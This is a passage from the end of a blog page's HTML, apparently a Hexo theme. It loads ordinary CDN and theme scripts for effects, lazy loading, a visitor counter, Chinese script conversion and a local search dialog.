src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script async src="/js/search/local-search.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="/js/nightshift.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zindex="-1" data-click="false"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
+POWERMODE.shake = true; // turn off shake
+document.body.addEventListener('input', POWERMODE);
+</script><script src="/js/tw_cn.js"></script><script>translateInitilization()
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
+observer.observe();</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
